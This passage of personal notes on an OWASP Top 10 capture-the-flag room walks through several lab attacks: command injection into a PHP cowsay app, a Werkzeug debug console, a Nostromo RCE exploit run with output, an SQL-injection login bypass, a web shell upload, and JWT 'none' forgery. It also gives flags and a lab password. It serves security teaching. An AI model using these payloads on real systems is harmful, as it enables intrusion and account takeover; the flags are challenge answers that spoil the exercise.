id="Code-Example"><a href="#Code-Example" class="headerlink" title="Code Example"></a>Code Example</h3><p>Let’s consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text. While searching for ways to implement their app, they’ve come across the <code>cowsay</code> command in Linux, which does just that! Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system’s console and sends back its contents to the website.</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;mooing&quot;</span>])) &#123;        <span class="hljs-variable">$mooing</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;mooing&quot;</span>];        <span class="hljs-variable">$cow</span> = <span class="hljs-string">&#x27;default&#x27;</span>;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cow&quot;</span>]))            <span class="hljs-variable">$cow</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cow&quot;</span>];                <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;perl /usr/bin/cowsay -f <span class="hljs-subst">$cow</span> <span class="hljs-subst">$mooing</span>&quot;</span>);    &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>In simple terms, the above snippet does the following:</p><ul><li>Checking if the parameter <code>&quot;mooing&quot;</code> is set. If it is, the variable <code>$mooing</code> gets what was passed into the input field.</li><li>Checking if the parameter “cow” is set. If it is, the variable <code>$cow</code> gets what was passed through the parameter.</li><li>The program then executes the function:</li></ul><pre><code class="hljs php"><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;perl /usr/bin/cowsay -f <span class="hljs-subst">$cow</span> <span class="hljs-subst">$mooing</span>&quot;</span>);</code></pre><p>The passthru function simply executes a command in the operating system’s console and sends the output back to the user’s browser. </p><p>You can see that our command is formed by concatenating the <code>$cow</code> and <code>$mooing</code> variables at the end of it. </p><p>Since we can manipulate those variables, we can try injecting additional commands by using simple tricks. </p><p>If you want to, you can read the docs on passthru() on PHP’s website for more information on the function itself:</p><ul><li><a href="https://www.php.net/manual/en/function.passthru.php">https://www.php.net/manual/en/function.passthru.php</a></li></ul><p><img src="/../owasp_img/9.png" alt="alt text"></p><h3 id="Exploiting-Command-Injection"><a href="#Exploiting-Command-Injection" class="headerlink" title="Exploiting Command Injection"></a>Exploiting Command Injection</h3><p>Now that we know how the application works behind the curtains, we will take advantage of a bash feature called “inline commands” to abuse the cowsay server and execute any arbitrary command we want. </p><p>Bash allows you to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed. </p><p>To execute inline commands, you only need to enclose them in the following format <code>$(your_command_here)</code>. If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example, which runs <code>whoami</code> as an inline command inside an <code>echo</code> command:</p><p><img src="/../owasp_img/10.png" alt="alt text"></p><p>So coming back to the cowsay server, here’s what would happen if we send an inline command to the web application:</p><p><img src="/../owasp_img/11.png" alt="alt text"></p><p>Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay. This will make our cow say whatever the command returns! In case you are not that familiar with Linux, here are some other commands you may want to try:</p><pre><code class="hljs plaintext">whoamiidifconfig/ip addruname -aps -ef</code></pre><p><img src="/../owasp_img/12.png" alt="alt text"></p><p>Command used:</p><pre><code class="hljs php">perl /usr/bin/cowsay -f <span class="hljs-keyword">default</span> $(id)</code></pre><p>We can get creative from now on</p><h1 id="Insecure-Design"><a href="#Insecure-Design" class="headerlink" title="Insecure Design"></a>Insecure Design</h1><p> Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app. Some other times, insecure design vulnerabilities may also be introduced by developers while adding some “shortcuts” around the code to make their testing easier. A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.</p><h2 id="Insecure-Password-Resets"><a href="#Insecure-Password-Resets" class="headerlink" title="Insecure Password Resets"></a>Insecure Password Resets</h2><p>A good example of such vulnerabilities occurred on Instagram a while ago. Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation. If an attacker wanted to access a victim’s account, he could try to brute-force the 6-digit code. As expected, this was not directly possible as Instagram had rate-limiting implemented so that after 250 attempts, the user would be blocked from trying further. </p><p><img src="/../owasp_img/17.png" alt="alt text"></p><p>However, it was found that the rate-limiting only applied to code attempts made from the same IP. If an attacker had several different IP addresses from where to send requests, he could now try 250 codes per IP. For a 6-digit code, you have a million possible codes, so an attacker would need 1000000&#x2F;250 &#x3D; 4000 IPs to cover all possible codes. This may sound like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible.</p><p><img src="/../owasp_img/18.png" alt="alt text"></p><p>Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code. The problem is in the design rather than the implementation of the application in itself.</p><h3 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h3><p>Since insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the application from the ground up and is usually harder to do than any other simple code-related vulnerability. The best approach to avoid such vulnerabilities is to perform threat modelling at the early stages of the development lifecycle. To get more information on how to implement secure development lifecycles, be sure to check out the SSDLC room.</p><h3 id="Practical-Example"><a href="#Practical-Example" class="headerlink" title="Practical Example"></a>Practical Example</h3><p>Go to i forgot my pass</p><p><img src="/../owasp_img/19.png" alt="alt text"></p><p>Now we can brute force the security question, after trying some colors we found the correct one <code>green</code>:</p><p><img src="/../owasp_img/20.png" alt="alt text"></p><p><img src="/../owasp_img/21.png" alt="alt text"></p><p>Pass: YxEoV0ClzDhUFO</p><p><img src="/../owasp_img/22.png" alt="alt text"></p><h1 id="Security-Misconfigurations"><a href="#Security-Misconfigurations" class="headerlink" title="Security Misconfigurations"></a>Security Misconfigurations</h1><p>Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.</p><p>Security misconfigurations include:</p><ul><li>Poorly configured permissions on cloud services, like S3 buckets.</li><li>Having unnecessary features enabled, like services, pages, accounts or privileges.</li><li>Default accounts with unchanged passwords.</li><li>Error messages that are overly detailed and allow attackers to find out more about the system.</li><li>Not using HTTP security headers.</li></ul><p>This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XML External Entities (XXE) or command injection on admin pages.</p><h2 id="Debugging-Interfaces"><a href="#Debugging-Interfaces" class="headerlink" title="Debugging Interfaces"></a>Debugging Interfaces</h2><p>A common security misconfiguration concerns the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it’s being developed. Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.</p><p>One example of such a vulnerability was allegedly used when Patreon got hacked in 2015. Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on &#x2F;console, or it will also be presented to the user if an exception is raised by the application. In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.</p><p><img src="/../owasp_img/23.png" alt="alt text"></p><h3 id="Practical-example"><a href="#Practical-example" class="headerlink" title="Practical example"></a>Practical example</h3><p>This VM showcases a Security Misconfiguration as part of the OWASP Top 10 Vulnerabilities list.</p><p>Go to the ip and go into &#x2F;console:</p><p><img src="/../owasp_img/24.png" alt="alt text"></p><p>→ We ran this command </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os; <span class="hljs-built_in">print</span>(os.popen(<span class="hljs-string">&quot;ls -l&quot;</span>).read())</code></pre><p>→ chmod a+r </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os; <span class="hljs-built_in">print</span>(os.popen(<span class="hljs-string">&quot;chmod a+r&quot;</span>).read())</code></pre><p>→ Read <a href="http://app.py/">app.py</a> :</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os; <span class="hljs-built_in">print</span>(os.popen(<span class="hljs-string">&quot;cat app.py&quot;</span>).read())</code></pre><ul><li>output:</li></ul><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for<span class="hljs-keyword">from</span> flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemysecret_flag = <span class="hljs-string">&quot;THM&#123;Just_a_tiny_misconfiguration&#125;&quot;</span>PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))DATABASE = os.path.join(PROJECT_ROOT, <span class="hljs-string">&#x27;todo.db&#x27;</span>)app = Flask(__name__)app.config[<span class="hljs-string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="hljs-string">&quot;sqlite:////&quot;</span> + DATABASEdb = SQLAlchemy(app)<span class="hljs-keyword">class</span> <span class="hljs-title class_">Todo</span>(db.Model):    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)    title = db.Column(db.String(<span class="hljs-number">80</span>))    complete = db.Column(db.Boolean)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    todo_list = Todo.query.<span class="hljs-built_in">all</span>()    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, todo_list=todo_list)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/add&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():    title = request.form.get(<span class="hljs-string">&quot;title&quot;</span>)    new_todo = Todo(title=title, complete=<span class="hljs-literal">False</span>)    db.session.add(new_todo)    db.session.commit()    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;index&quot;</span>))<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/complete/&lt;string:todo_id&gt;&quot;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">complete</span>(<span class="hljs-params">todo_id</span>):    todo = Todo.query.filter_by(<span class="hljs-built_in">id</span>=todo_id).first()    todo.complete = <span class="hljs-keyword">not</span> todo.complete    db.session.commit()    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;index&quot;</span>))<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/delete/&lt;string:todo_id&gt;&quot;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">todo_id</span>):    todo = Todo.query.filter_by(<span class="hljs-built_in">id</span>=todo_id).first()    db.session.delete(todo)    db.session.commit()    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;index&quot;</span>))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    db.create_all()    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)</code></pre><p>secret_flag &#x3D; <code>THM&#123;Just_a_tiny_misconfiguration&#125;</code></p><h1 id="Vulnerable-and-Outdated-Components"><a href="#Vulnerable-and-Outdated-Components" class="headerlink" title="Vulnerable and Outdated Components"></a>Vulnerable and Outdated Components</h1><p>Occasionally, you may find that the company&#x2F;entity you’re pen-testing is using a program with a well-known vulnerability.</p><p>For example, let’s say that a company hasn’t updated their version of WordPress for a few years, and using a tool such as WPScan, you find that it’s version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better, you can find an exploit already made on Exploit-DB.</p><p>As you can see, this would be quite devastating because it requires very little work on the attacker’s part. </p><p>Since the vulnerability is already well known, someone else has likely made an exploit for the vulnerability already. The situation worsens when you realise that it’s really easy for this to happen. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.</p><h2 id="Vulnerable-and-Outdated-Components-Exploit"><a href="#Vulnerable-and-Outdated-Components-Exploit" class="headerlink" title="Vulnerable and Outdated Components - Exploit"></a>Vulnerable and Outdated Components - Exploit</h2><p>Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software and research it until we can find an exploit. Let’s go through that with an example web application.</p><p><img src="/../owasp_img/25.png" alt="alt text"></p><p>What do you know? This server has the default page for the Nostromo web server. Now that we have a version number and a software name, we can use Exploit-DB to try and find an exploit for this particular version.</p><p><img src="/../owasp_img/26.png" alt="alt text"></p><p>Lucky us, the top result happens to be an exploit script. Let’s download it and try to get code execution. Running this script on its own teaches us a very important lesson.</p><p>Exploits you download from the Internet may not work the first time. It helps to understand the programming language the script is in so that, if needed, you can fix any bugs or make any modifications, as quite a few scripts on Exploit-DB expect you to make modifications.</p><p>Fortunately, the error was caused by a line that should have been commented out, so it’s an easy fix.</p><pre><code class="hljs python"><span class="hljs-comment"># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span><span class="hljs-comment"># Date: 2019-12-31</span><span class="hljs-comment"># Exploit Author: Kr0ff</span><span class="hljs-comment"># Vendor Homepage:</span><span class="hljs-comment"># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span><span class="hljs-comment"># Version: 1.9.6</span><span class="hljs-comment"># Tested on: Debian</span><span class="hljs-comment"># CVE : CVE-2019-16278</span>cve2019_16278.py  <span class="hljs-comment"># This line needs to be commented.</span><span class="hljs-comment">#!/usr/bin/env python</span></code></pre><p>Fixing that, let’s try and run the program again.</p><pre><code class="hljs python">ser@linux$ python2 <span class="hljs-number">47837.</span>py <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">80</span> <span class="hljs-built_in">id</span>                                        _____-<span class="hljs-number">2019</span>-<span class="hljs-number">16278</span>        _____  _______    ______   _____\    \   _____\    \_\      |  |      | /    / |    |  /     /|     ||     /  /     /|/    /  /___/| /     / /____/||\    \  \    |/|    |__ |___|/|     | |____|/ \ \    \ |    | |       \|     |  _____   \|     \|    | |     __/ __|\     \|\    \   |\         /| |\    \  /  \| \_____\|    |   | \_______/ | | \____\/    || |     /____/|    \ |     | /  | |    |____/| \|_____|    ||     \|_____|/    \|____|   | |        |____|/                        |___|/HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OKDate: Fri, 03 Feb <span class="hljs-number">2023</span> 04:<span class="hljs-number">58</span>:<span class="hljs-number">34</span> GMTServer: nostromo <span class="hljs-number">1.9</span><span class="hljs-number">.6</span>Connection: closeuid=<span class="hljs-number">1001</span>(_nostromo) gid=<span class="hljs-number">1001</span>(_nostromo) groups=<span class="hljs-number">1001</span>(_nostromo)</code></pre><p>Boom! We have RCE. Now it’s important to note that most scripts will tell you what arguments you need to provide. Exploit developers will rarely make you read potentially hundreds of lines of code just to figure out how to use the script.</p><p>It is also worth noting that it may not always be this easy. Sometimes you will just be given a version number, like in this case, but other times you may need to dig through the HTML source or even take a lucky guess on an exploit script. </p><p>But realistically, if it is a known vulnerability, there’s probably a way to discover what version the application is running.</p><p>That’s really it. The great thing about this piece of the OWASP Top 10 is that the work is already done for us, we just need to do some basic research, and as a penetration tester, you’re already doing that quite a bit.</p><h3 id="Vulnerable-and-Outdated-Components-Lab"><a href="#Vulnerable-and-Outdated-Components-Lab" class="headerlink" title="Vulnerable and Outdated Components - Lab"></a>Vulnerable and Outdated Components - Lab</h3><p>→ Found this exploit : </p><p>CSE Bookstore 1.0 - Authentication Bypass</p><p><a href="https://www.exploit-db.com/exploits/48960">https://www.exploit-db.com/exploits/48960</a></p><p>Log in :</p><pre><code class="hljs python">Payload: Name: adminPass: %<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></code></pre><p>After logging in let’s try to add a new book and upload a php reverse shell </p><p>→ Set the php reverse shell </p><p><img src="/../owasp_img/Screenshot%202024-07-16%20at%2015.48.06.png" alt="alt text"></p><p>→ start a netcat on port 4444 and let’s try to upload it </p><p>Not working.. let’s try another exploit:</p><p><a href="https://www.exploit-db.com/exploits/47887">https://www.exploit-db.com/exploits/47887</a></p><p>Run the exploit after downloading it :</p><pre><code class="hljs python">└─$ python3 <span class="hljs-number">47887.</span>py http://<span class="hljs-number">10.10</span><span class="hljs-number">.239</span><span class="hljs-number">.227</span>:<span class="hljs-number">84</span>&gt; Attempting to upload PHP web shell...&gt; Verifying shell upload...&gt; Web shell uploaded to http://<span class="hljs-number">10.10</span><span class="hljs-number">.239</span><span class="hljs-number">.227</span>:<span class="hljs-number">84</span>/bootstrap/img/cDMOdXYP35.php&gt; Example command usage: http://<span class="hljs-number">10.10</span><span class="hljs-number">.239</span><span class="hljs-number">.227</span>:<span class="hljs-number">84</span>/bootstrap/img/cDMOdXYP35.php?cmd=whoami&gt; Do you wish to launch a shell here? (y/n): yRCE $  RCE $ cat /opt/flag.txtTHM&#123;But_1ts_n0t_my_f4ult!&#125;</code></pre><h1 id="Identification-and-Authentication-Failures"><a href="#Identification-and-Authentication-Failures" class="headerlink" title="Identification and Authentication Failures"></a>Identification and Authentication Failures</h1><p>Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, and the server would verify them. The server would then provide the users’ browser with a session cookie if they are correct. A session cookie is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of users’ actions. </p><p>If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other users’ accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). </p><p>Some common flaws in authentication mechanisms include the following:</p><ul><li>Brute force attacks:  If a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.</li><li>Use of weak credentials: Web applications should set strong password policies. If applications allow users to set passwords such as “password1” or common passwords, an attacker can easily guess them and access user accounts.</li><li>Weak session cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users’ accounts.</li></ul><h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul><li>To avoid password-guessing attacks, ensure the application enforces a strong password policy.</li><li>To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.</li><li>Implement Multi-Factor Authentication. If a user has multiple authentication methods, for example, using a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get both the password and the code to access the account.</li></ul><h2 id="Identification-and-Authentication-Failures-Practical"><a href="#Identification-and-Authentication-Failures-Practical" class="headerlink" title="Identification and Authentication Failures Practical"></a>Identification and Authentication Failures Practical</h2><p>For this example, we’ll look at a logic flaw within the authentication mechanism.</p><p>Many times, what happens is that developers forget to sanitise the input(username &amp; password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we will focus on a vulnerability that happens because of a developer’s mistake but is very easy to exploit, i.e. re-registration of an existing user.</p><p>Let’s understand this with the help of an example, say there is an existing user with the name <code>admin</code>, and we want access to their account, so what we can do is try to re-register that username but with slight modification. </p><p>We will enter “ admin” without the quotes (notice the space at the start). </p><p>Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user admin.</p><h3 id="Challange-1"><a href="#Challange-1" class="headerlink" title="Challange"></a>Challange</h3><p>Register a new user with the username “ darren“ with a space before :</p><p><img src="/../owasp_img/27.png" alt="alt text"></p><p>Found flags.</p><h1 id="Software-and-Data-Integrity-Failures"><a href="#Software-and-Data-Integrity-Failures" class="headerlink" title="Software and Data Integrity Failures"></a>Software and Data Integrity Failures</h1><h2 id="What-is-Integrity"><a href="#What-is-Integrity" class="headerlink" title="What is Integrity?"></a>What is Integrity?</h2><p>When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn’t modified in transit or somehow got damaged by a transmission error?</p><p>To overcome this problem, you will often see a hash sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn’t modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available. </p><p>Let’s take WinSCP as an example to understand better how we can use hashes to check a file’s integrity. If you go to their Sourceforge repository, you’ll see that for each file available to download, there are some hashes published along:</p><p><img src="/../owasp_img/28.png" alt="alt text"></p><p>These hashes were precalculated by the creators of WinSCP so that you can check the file’s integrity after downloading. If we download the <code>WinSCP-5.21.5-Setup.exe</code> file, we can recalculate the hashes and compare them against the ones published in Sourceforge. To calculate the different hashes in Linux, we can use the following commands:</p><pre><code class="hljs bash">user@attackbox$ <span class="hljs-built_in">md5sum</span> WinSCP-5.21.5-Setup.exe          20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe                                                                                                                user@attackbox$ <span class="hljs-built_in">sha1sum</span> WinSCP-5.21.5-Setup.exe c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe                                                                                                                user@attackbox$ <span class="hljs-built_in">sha256sum</span> WinSCP-5.21.5-Setup.exe e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe</code></pre><p>Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.</p><h2 id="Software-and-Data-Integrity-Failures-1"><a href="#Software-and-Data-Integrity-Failures-1" class="headerlink" title="Software and Data Integrity Failures"></a>Software and Data Integrity Failures</h2><p>This vulnerability arises from code or infrastructure that uses software or data without using any kind of integrity checks. </p><p>Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences. </p><p>There are mainly two types of vulnerabilities in this category:</p><ul><li>Software Integrity Failures</li><li>Data Integrity Failures</li></ul><h2 id="Software-Integrity-Failures"><a href="#Software-Integrity-Failures" class="headerlink" title="Software Integrity Failures"></a>Software Integrity Failures</h2><p>Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:</p><pre><code class="hljs bash">&lt;script src=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span>&gt;&lt;/script&gt;</code></pre><p>When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.</p><p><img src="/../owasp_img/29.png" alt="alt text"></p><p>The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of <a href="https://code.jquery.com/jquery-3.6.1.min.js">https://code.jquery.com/jquery-3.6.1.min.js</a> to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library’s URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it here.</p><p>The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won’t execute the modified version. Here’s how that should look in HTML:</p><pre><code class="hljs bash">&lt;script src=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span> integrity=<span class="hljs-string">&quot;sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=&quot;</span> crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</code></pre><p>You can go to <a href="https://www.srihash.org/">https://www.srihash.org/</a> to generate hashes for any library if needed.</p><p>What is the SHA-256 hash of <a href="https://code.jquery.com/jquery-1.12.4.min.js">https://code.jquery.com/jquery-1.12.4.min.js</a>?</p><p>Go to :<a href="https://www.srihash.org/">https://www.srihash.org/</a> → paste the url there and copy the SHA-256 hash</p><h2 id="Data-Integrity-Failures"><a href="#Data-Integrity-Failures" class="headerlink" title="Data Integrity Failures"></a>Data Integrity Failures</h2><p>Let’s think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user’s browser and that will be automatically repeated on each request to the website that issued them.</p><p><img src="/../owasp_img/30.png" alt="alt text"></p><p>For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. </p><p>This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user’s browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! </p><p>This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.</p><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>One solution to this is to use some integrity mechanism to guarantee that the cookie hasn’t been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is JSON Web Tokens (JWT).</p><p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won’t be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:</p><p><img src="/../owasp_img/31.png" alt="alt text"></p><p>The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. </p><p>The payload contains the key-value pairs with the data that the web application wants the client to store. </p><p>The signature is similar to a hash, taken to verify the payload’s integrity. If you change the payload, the web application can verify that the signature won’t match the payload and know that you tampered with the JWT. </p><p>Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won’t be able to generate the matching signature unless you know the secret key.</p><p>Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use this online tool to encode&#x2F;decode base64. Try decoding the header and payload of the following token:</p><p><a href="https://appdevtools.com/base64-encoder-decoder">https://appdevtools.com/base64-encoder-decoder</a></p><pre><code class="hljs bash">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw</code></pre><p>Note: The signature contains binary data, so even if you decode it, you won’t be able to make much sense of it anyways.</p><h2 id="JWT-and-the-None-Algorithm"><a href="#JWT-and-the-None-Algorithm" class="headerlink" title="JWT and the None Algorithm"></a>JWT and the None Algorithm</h2><p>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</p><ul><li>Modify the header section of the token so that the alg header would contain the value none.</li><li>Remove the signature part.</li></ul><p>Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes “admin” and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.</p><p><img src="/../owasp_img/32.png" alt="alt text"></p><h3 id="Challange-2"><a href="#Challange-2" class="headerlink" title="Challange:"></a>Challange:</h3><p><img src="/../owasp_img/33.png" alt="alt text"></p><p><img src="/../owasp_img/34.png" alt="alt text"></p><p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE3NTI3MTczfQ.Tw6Yvjv0EIq7oV87-VwgKMy7nAgpryasvzRjWHv5B48</p><p>Decode the header and change the alg to <code>none</code>:</p><p><img src="/../owasp_img/35.png" alt="alt text"></p><p>Do the same with the payload and change user to <code>admin</code> </p><p><img src="/../owasp_img/36.png" alt="alt text"></p><p>Now go back into the web app and paste the new JWT session:</p><pre><code class="hljs bash">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE3NTI3MTczfQ==.</code></pre><p><img src="/../owasp_img/37.png" alt="alt text"></p><h1 id="Security-Logging-and-Monitoring-Failures"><a href="#Security-Logging-and-Monitoring-Failures" class="headerlink" title="Security Logging and Monitoring Failures"></a>Security Logging and Monitoring Failures</h1><p>When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers’ activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:</p><ul><li>Regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.</li><li>Risk of further attacks: an attacker’s presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.</li></ul><p>The information stored in logs should include the following:</p><ul><li>HTTP status codes</li><li>Time Stamps</li><li>Usernames</li><li>API endpoints&#x2F;page locations</li><li>IP addresses</li></ul><p>These logs have some sensitive information, so it’s important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p><p>As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they’ve made if their presence has been detected much later than 